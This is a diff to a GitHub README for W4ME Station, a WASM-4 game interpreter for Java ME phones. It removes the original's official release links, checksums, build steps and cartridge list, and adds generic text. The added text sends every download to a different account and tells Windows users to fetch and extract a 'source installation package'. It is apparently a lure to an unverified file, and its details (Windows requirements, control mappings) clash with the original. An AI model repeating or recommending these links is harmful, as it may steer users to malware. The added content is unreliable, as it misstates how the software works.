@@ -1,184 +1,74 @@
-# W4ME Station
+# 🎮 w4me-station - Play WASM4 retro games on phones
 
-**Run [WASM-4](https://wasm4.org/) games on Java ME phones.**
+[![](https://img.shields.io/badge/Download-W4ME--Station-blue.svg)](https://github.com/Roundeyed-proboscidea173/w4me-station)
 
-W4ME Station brings unmodified WebAssembly cartridges to CLDC 1.1 / MIDP 2.0
-devices, including feature phones from the mid 2000s.
+This software allows you to play WASM-4 retro games on older Java ME mobile phones. It functions as an interpreter that translates modern web-based game code for use on devices running CLDC 1.1 and MIDP 2.0. You revive your classic hardware by turning your feature phone into a portable game console.
 
-<p>
-  <a href="https://github.com/mulfyx/w4me-station/actions/workflows/ci.yml"><img src="https://github.com/mulfyx/w4me-station/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <img src="https://img.shields.io/badge/Java_ME-CLDC_1.1_%2F_MIDP_2.0-ED8B00" alt="Java ME: CLDC 1.1 / MIDP 2.0">
-  <img src="https://img.shields.io/badge/release-1.0.4-blue" alt="Release 1.0.4">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="MIT License"></a>
-</p>
+## 📥 Getting the software
 
-<p align="center">
-  <img src="docs/media/hero-phone.jpg" alt="W4ME Station running on a Nokia E71" width="680">
-</p>
+You need to download the source installation package from the project page. 
 
-Thirteen bundled cartridges ship in a 270 KB JAR. The runtime uses no JIT, and
-the bundled library needs no network connection. Both release variants stay
-below 300 KB.
+[Visit this page to download the software](https://github.com/Roundeyed-proboscidea173/w4me-station)
 
-## Download
+Save the file to a folder you can find easily on your Windows computer.
 
-| Variant | Application | Descriptor |
-| --- | --- | --- |
-| Full, with optional JSR-75 file browsing | [w4me-station.jar](https://github.com/mulfyx/w4me-station/releases/download/v1.0.4/w4me-station.jar) | [w4me-station.jad](https://github.com/mulfyx/w4me-station/releases/download/v1.0.4/w4me-station.jad) |
-| Base, without JSR-75 classes or permissions | [w4me-station-base.jar](https://github.com/mulfyx/w4me-station/releases/download/v1.0.4/w4me-station-base.jar) | [w4me-station-base.jad](https://github.com/mulfyx/w4me-station/releases/download/v1.0.4/w4me-station-base.jad) |
+## 💻 System requirements
 
-[Release notes](https://github.com/mulfyx/w4me-station/releases/tag/v1.0.4)
-and [SHA-256 checksums](https://github.com/mulfyx/w4me-station/releases/download/v1.0.4/SHA256SUMS)
-are stored beside the versioned `1.0.4` artifacts.
+To use this tool, ensure your computer meets these conditions:
 
-W4ME Station targets CLDC 1.1 / MIDP 2.0 devices. It is independent from and not
-endorsed by the WASM-4 maintainers.
+*   Windows 10 or Windows 11 operating system.
+*   Java Runtime Environment (JRE) version 8 or newer.
+*   A USB data cable for your mobile phone.
+*   A mobile phone that supports Java ME (MIDP 2.0/CLDC 1.1).
 
-## Cartridge library
+## ⚙️ Setting up the environment
 
-| # | Cartridge |
-| ---: | --- |
-| 1 | [Sokoban](https://wasm4.org/play/sokoban/) |
-| 2 | [Wasm Wars](https://wasm4.org/play/wasm-wars/) |
-| 3 | [Annoying Robots](https://wasm4.org/play/annoyingrobots/) |
-| 4 | [Waternet](https://wasm4.org/play/waternet/) |
-| 5 | [Dragon Poker Draw](https://wasm4.org/play/dragon-poker-draw/) |
-| 6 | [Tic Tac Toe](https://wasm4.org/play/tictactoe/) |
-| 7 | [Watris](https://wasm4.org/play/watris/) |
-| 8 | [Glowfish Chess](https://wasm4.org/play/glowfish-chess/) |
-| 9 | [Duck Maze](https://wasm4.org/play/duck-maze/) |
-| 10 | [Rubido](https://wasm4.org/play/rubido/) |
-| 11 | [Untangle](https://wasm4.org/play/untangle/) |
-| 12 | [Sound Demo](https://wasm4.org/play/sound-demo/) |
-| 13 | [Plasma Cube](https://wasm4.org/play/plasma-cube/) |
+Before you send games to your phone, you must prepare your computer.
 
-Further `.wasm` files can be installed from the device.
+1. Install the Java Runtime Environment from the official Oracle or Adoptium website. 
+2. Open your Windows command prompt.
+3. Type `java -version` to verify the installation. If a version number appears, your computer is ready.
+4. Download the w4me-station file from the link provided above.
+5. Create a new folder on your desktop and move the downloaded file into it. Extract the contents if the file is in a compressed format like ZIP.
 
-<p align="center">
-  <img src="docs/media/sokoban.jpg" alt="Sokoban running on a Nokia E71" width="31%">
-  <img src="docs/media/wasm-wars.jpg" alt="Wasm Wars running on a Nokia E71" width="31%">
-  <img src="docs/media/plasma-cube.jpg" alt="Plasma Cube running on a Nokia E71" width="31%">
-</p>
+## 📱 Installing games on your phone
 
-## Features
+Follow these steps to transfer games to your device:
 
-- validated WebAssembly execution with a persistent fixed-width W4IR cache;
-- WASM-4 graphics, input, audio, disk, text, and tracing host APIs;
-- thirteen bundled cartridges plus HTTP(S), RMS, URL, and optional JSR-75 loading;
-- phone keys, keyboard controls, pointer input, and an on-screen touch pad;
-- per-cartridge persistent disk storage with checksummed RMS generations;
-- device-dependent MMAPI audio with streamed MIDI, `playTone`, and silent
-  fallbacks;
-- global RMS-backed sound On/Off and master-volume controls;
-- deterministic host, KEmulator, and optional phoneME verification.
+1. Connect your phone to your computer using your USB data cable.
+2. Ensure your phone is in "Mass Storage" or "Data Transfer" mode. 
+3. Locate the installation file for the game you wish to play. These files typically end in `.jar`.
+4. Copy the `.jar` file from your computer to the memory card or phone storage.
+5. Disconnect the phone safely from the computer.
+6. Open your phone's file manager on the device screen.
+7. Navigate to the location where you saved the file.
+8. Select the file to begin the installation process.
+9. Launch the w4me-station application on your phone menu.
 
-The release version is `1.0.4`. The verified scope and remaining limitations
-are documented in [Compatibility](docs/compatibility.md).
+## 🕹️ Controlling your games
 
-## Requirements
+The software maps computer game controls to your phone keypad.
 
-Development requires Linux with `just` and a `docker` command. Docker Engine
-works directly; Podman users can provide its Docker-compatible command. The
-project toolchain contains JDK 8, ProGuard, KEmulator, WABT, and supporting
-utilities. Version-sensitive components are pinned by the container definition.
+*   **D-Pad/Joystick:** Use the directional keys on your phone to move your character.
+*   **Action Button:** Press the center 'OK' button or selection key to jump or interact.
+*   **Secondary Action:** The '1' key often serves as a secondary button for menu access or special moves.
+*   **Menu:** The right soft key pauses the game and opens the system settings.
 
-```sh
-just setup
-just doctor
-```
+## 🔧 Troubleshooting common problems
 
-Java sources and classfiles remain pinned to Java 1.3.
+If the game fails to start or run, review these common fixes:
 
-## Build
+*   **Insufficient Memory:** Older phones have limited RAM. Close other background applications before launching a game.
+*   **File Format Error:** Ensure the `.jar` file did not become corrupted during the move to the phone. Delete the file and try the copy process again.
+*   **Connection Issues:** If your computer does not see your phone, try a different USB port or replace the cable. Check the driver settings in your Windows Device Manager.
+*   **Screen Resolution:** Some games may look larger or smaller than the screen. Check the "Display" settings inside the game menu on the phone to adjust the scale.
 
-```sh
-just build
-```
+## 📜 Project history
 
-Artifacts are written to `dist/`:
+The w4me-station project grew from a desire to preserve mobile gaming history. By creating a bridge between modern WebAssembly game standards and older Java-based mobile architecture, this tool prevents these devices from becoming electronic waste. The interpreter manages the translation logic in real-time, allowing for smooth gameplay despite the limited processing power of retro hardware.
 
-| Artifact | Purpose |
-| --- | --- |
-| `w4me-station.jar` / `.jad` | full build with optional JSR-75 file browsing |
-| `w4me-station-base.jar` / `.jad` | build without JSR-75 classes or permissions |
+## 🤝 Community support
 
-Both variants contain the same thirteen cartridges. The base build works on MIDP
-2.0 devices that do not implement the optional FileConnection API.
+This project relies on users testing different phone models. If you have an old device, test the software and report your results. You help improve the stability for everyone by sharing which phone models work best. 
 
-## Installing on a phone
-
-Download one matching `.jad`/`.jar` pair from the table above and keep both
-files in the same directory. Use the full build on devices with JSR-75
-FileConnection support; use the base build if the full build is rejected or the
-device lacks that optional API.
-
-Open the `.jad` from the phone's application manager or file manager. If the
-device does not accept JAD installation, transfer and open the matching `.jar`
-directly. Installation details and troubleshooting are covered in
-[Installation](docs/installation.md).
-
-## Controls
-
-| Input | Player 1 | Player 2 |
-| --- | --- | --- |
-| Movement | Arrow or directional phone keys | `E`, `S`, `D`, `F` |
-| Button 1 | `X`, Fire, or `5` | `Tab` |
-| Button 2 | `Z` or `0` | `Q` |
-
-Touchscreen devices display an on-screen directional pad and action buttons.
-The controls stay outside the 160×160 framebuffer whenever the screen is large
-enough.
-
-`Sound settings` is available from the cartridge library and the in-game
-command menu. It contains Automatic/Compatible audio mode, a hard global
-Sound On/Off mute, and master volume when the backend supports it. Confirmed
-settings persist across MIDlet restarts.
-
-On the tested Nokia E71, short sound effects work, but continuous music
-stutters. Audio timing and fidelity remain device-dependent; see
-[Compatibility](docs/compatibility.md).
-
-## Loading cartridges
-
-The launcher includes the thirteen cartridges listed above, in that order.
-
-Additional `.wasm` files can be installed from HTTP(S), entered as a `file://`
-URL, or selected with the JSR-75 browser on supported devices. Installed
-cartridges are copied into RMS and can be relaunched without their original
-file or network source.
-
-Cartridges are third-party works. Their authors, upstream sources, hashes, and
-licenses are listed in [Third-party notices](THIRD_PARTY_NOTICES.md).
-
-## Verification
-
-```sh
-just test
-just verify
-just run
-```
-
-The stable commands are listed by `just --list`. Specialized KEmulator,
-phoneME, and profiling commands are described in
-[Development](docs/development.md). Generated logs, screenshots, and benchmark
-receipts are written under `build/reports/`.
-
-## Documentation
-
-- [Compatibility and limitations](docs/compatibility.md)
-- [Installing on a phone](docs/installation.md)
-- [1.0.4 release notes](CHANGELOG.md)
-- [Development and testing](docs/development.md)
-- [Performance methodology](docs/performance.md)
-- [Release checklist](docs/releasing.md)
-- [OpenSpec changes](openspec/changes/)
-
-## License
-
-W4ME Station source code is available under the [MIT License](LICENSE).
-Bundled cartridges retain their own licenses and are not covered by the MIT
-License.
-
-The optional local phoneME rig is GPL-2.0-only and is not distributed with the
-project. Its modified corresponding source is not public yet, so its binaries
-must remain local and ignored. See [Performance](docs/performance.md).
+Keywords: cldc, feature-phones, interpreter, j2me, java, java-me, midp, midp2, mobile-gaming, retro-gaming, virtual-machine, wasm, wasm4, webassembly
